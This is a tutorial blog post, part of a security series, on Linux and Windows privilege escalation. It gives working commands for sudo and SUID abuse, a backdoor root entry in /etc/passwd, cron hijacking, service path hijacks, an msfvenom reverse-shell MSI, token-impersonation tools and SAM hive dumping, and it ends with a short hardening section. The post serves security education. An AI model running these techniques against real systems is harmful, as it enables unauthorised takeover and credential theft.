---
layout: post
title: "Privilege Escalation: From User to Root (Part 3)"
date: 2026-02-09 22:00:00 +0530
categories: [Cybersecurity, System Security]
tags: [privilege-escalation, linux, windows, suid, kernel-exploit]
image: /assets/images/sys-sec-bg.jpg
description: "Part 3 of the System Security Series. Techniques for escalating privileges on Linux and Windows systems, from misconfigurations to kernel exploits."
author: Tharunaditya Anuganti
series: "System Security"
series_order: 3
series_description: "Deep dive into OS internals, memory protection, kernel exploitation defense, and secure architecture design."
---

# The Path to Power

You've exploited a vulnerability and gained a shell—but as a low-privilege user. The juicy data requires root/Administrator. Database credentials are in files only root can read. Persistent access requires modifying system files.

**Privilege Escalation** is the art of going from limited access to full system control. It's the difference between a foothold and a compromise.

---

## Understanding Privilege Boundaries

### Linux
*   **root (UID 0)**: God mode. Can do anything.
*   **Regular users**: Limited to their files and permitted actions.
*   **sudo**: Temporary root privileges (if configured).

### Windows
*   **SYSTEM**: Highest privilege, used by OS itself.
*   **Administrator**: High privilege, can manage system.
*   **Standard User**: Limited, cannot install software or modify system.
*   **Service Accounts**: Often have excessive privileges.

---

## Linux Privilege Escalation

### Quick Wins Checklist

```bash
# Who am I?
id
whoami

# What can I sudo?
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Kernel version
uname -a
cat /etc/os-release

# Running services
ps aux
netstat -tulpn
```

### 1. Sudo Misconfigurations

```bash
$ sudo -l
User webapp may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim

# GTFOBins exploitation
$ sudo vim -c ':!/bin/bash'
root#
```

**GTFOBins** (gtfobins.github.io) catalogs binaries exploitable for privilege escalation.

### 2. SUID Binaries

SUID (Set User ID) binaries run with the owner's privileges (often root).

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/custom_backup

$ ls -la /usr/bin/custom_backup
-rwsr-xr-x 1 root root 16696 Jan 1 /usr/bin/custom_backup

# If it calls another program without full path:
$ export PATH=/tmp:$PATH
$ echo '/bin/bash' > /tmp/cp
$ chmod +x /tmp/cp
$ /usr/bin/custom_backup
root#
```

### 3. Capabilities

Linux capabilities grant specific privileges without full root.

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid+ep

# Python with setuid capability
$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root#
```

### 4. Writable /etc/passwd

If `/etc/passwd` is writable, add a root user:

```bash
$ openssl passwd -1 -salt xyz password123
$1$xyz$abcdefghijklmnop

$ echo 'backdoor:$1$xyz$abcdefghijklmnop:0:0:root:/root:/bin/bash' >> /etc/passwd
$ su backdoor
Password: password123
root#
```

### 5. Cron Job Exploitation

If a cron job runs a writable script as root:

```bash
$ cat /etc/crontab
* * * * * root /opt/scripts/backup.sh

$ ls -la /opt/scripts/backup.sh
-rwxrwxrwx 1 root root 245 Jan 1 /opt/scripts/backup.sh

$ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# Wait for cron to run
$ /tmp/rootbash -p
root#
```

### 6. Kernel Exploits

When configurations aren't exploitable, target the kernel itself.

```bash
$ uname -r
3.13.0-32-generic

# Search for exploits
$ searchsploit linux kernel 3.13
# Dirty COW, etc.
```

**Common Kernel Exploits:**
*   **Dirty COW (CVE-2016-5195)**: Race condition in copy-on-write.
*   **Dirty Pipe (CVE-2022-0847)**: Overwrite read-only files.
*   **Sudo Baron Samedit (CVE-2021-3156)**: Heap overflow in sudo.

---

## Windows Privilege Escalation

### Quick Wins Checklist

```powershell
# Current user info
whoami /all
net user %USERNAME%

# System info
systeminfo

# Installed patches
wmic qfe

# Running services
wmic service list brief

# Scheduled tasks
schtasks /query /fo LIST /v

# Unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows"

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 1. Unquoted Service Paths

If a service path has spaces and isn't quoted:

```
C:\Program Files\Vulnerable App\service.exe
```

Windows searches:
1.  `C:\Program.exe`
2.  `C:\Program Files\Vulnerable.exe`
3.  `C:\Program Files\Vulnerable App\service.exe`

If we can write to `C:\Program Files\`:
```cmd
copy malicious.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnerableService
sc start VulnerableService
```

### 2. Weak Service Permissions

If we can modify a service binary or configuration:

```cmd
# Check permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Modify service binary path
sc config VulnService binPath= "C:\temp\shell.exe"
sc stop VulnService
sc start VulnService
```

### 3. AlwaysInstallElevated

If both registry keys are set to 1, any user can install MSI packages as SYSTEM.

```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi > shell.msi

# On target
msiexec /quiet /qn /i shell.msi
```

### 4. Token Impersonation

If we have SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:

**JuicyPotato** (older Windows):
```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\shell.exe" -t *
```

**PrintSpoofer** (Windows 10/Server 2019):
```cmd
PrintSpoofer.exe -i -c "C:\temp\shell.exe"
```

### 5. Saved Credentials

```cmd
# Cached credentials
cmdkey /list

# If credentials exist
runas /savedcred /user:DOMAIN\Admin cmd.exe

# SAM database (requires SYSTEM)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Crack offline with secretsdump/samdump2
```

### 6. Kernel Exploits

Windows kernel exploits are powerful but risky (BSOD potential).

*   **MS16-032**: Secondary Logon Handle Privilege Escalation
*   **CVE-2021-1732**: Win32k Elevation of Privilege
*   **CVE-2021-36934 (HiveNightmare)**: SAM file access

---

## Automated Enumeration Tools

### Linux
*   **LinPEAS**: Comprehensive enumeration script.
*   **Linux Smart Enumeration (LSE)**: Similar, different output format.
*   **pspy**: Monitor processes without root.

### Windows
*   **WinPEAS**: Comprehensive enumeration.
*   **PowerUp**: PowerShell privilege escalation checks.
*   **Seatbelt**: Security-focused enumeration.
*   **BeRoot**: Checks common misconfigurations.

---

## Defense: Preventing Privilege Escalation

### Principle of Least Privilege
*   Users get minimum required permissions.
*   Review sudo access regularly.
*   Don't add users to administrators group by default.

### Patch Management
*   Apply kernel/OS updates promptly.
*   Kernel exploits are often the last resort—don't give attackers the option.

### Configuration Hardening
*   Audit SUID binaries.
*   Quote all service paths.
*   Remove AlwaysInstallElevated.
*   Restrict SeImpersonate privilege.

### Monitoring
*   Alert on privilege changes.
*   Monitor for enumeration commands.
*   Log and review cron/scheduled task modifications.

---

## Summary

*   **Privilege escalation** transforms limited access into full control.
*   **Linux vectors**: sudo, SUID, capabilities, cron, kernel.
*   **Windows vectors**: services, tokens, registry, kernel.
*   **Automation** (LinPEAS/WinPEAS) accelerates enumeration.
*   **Defense** requires least privilege, patching, and hardening.

**Next Part:** What happens when attackers get root and want to hide? **Rootkits and Persistence**.
